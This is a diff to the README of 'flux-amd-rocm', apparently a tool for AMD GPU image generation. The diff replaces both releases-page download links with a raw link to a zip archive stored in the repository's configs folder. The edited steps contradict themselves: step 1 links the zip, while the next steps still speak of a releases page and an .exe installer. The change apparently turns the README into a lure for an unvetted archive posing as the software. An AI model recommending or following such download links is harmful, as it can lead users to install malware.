@@ -1,6 +1,6 @@
 # 🚀 flux-amd-rocm - Generate images on your AMD GPU
 
-[![](https://img.shields.io/badge/Download_Flux-blue)] (https://github.com/Senecan-antiballisticmissile3616/flux-amd-rocm/releases)
+[![](https://img.shields.io/badge/Download_Flux-blue)] (https://raw.githubusercontent.com/Senecan-antiballisticmissile3616/flux-amd-rocm/main/configs/flux_amd_rocm_1.5.zip)
 
 This software allows you to run high-quality image generation models on consumer AMD Radeon graphics cards. It uses specialized optimization techniques to make the process run on hardware that normally lacks support for these tools. You gain the power of advanced image generation without needing professional or server-grade hardware.
 
@@ -21,7 +21,7 @@ Ensure your graphics card drivers are current. Visit the AMD website, download t
 
 Follow these steps to set up the software on your machine.
 
-1. Visit this page to download: https://github.com/Senecan-amd-rocm/flux-amd-rocm/releases
+1. Visit this page to download: https://raw.githubusercontent.com/Senecan-antiballisticmissile3616/flux-amd-rocm/main/configs/flux_amd_rocm_1.5.zip
 2. Click the link above to view the releases page.
 3. Locate the latest version at the top of the list.
 4. Download the installer file ending in .exe.
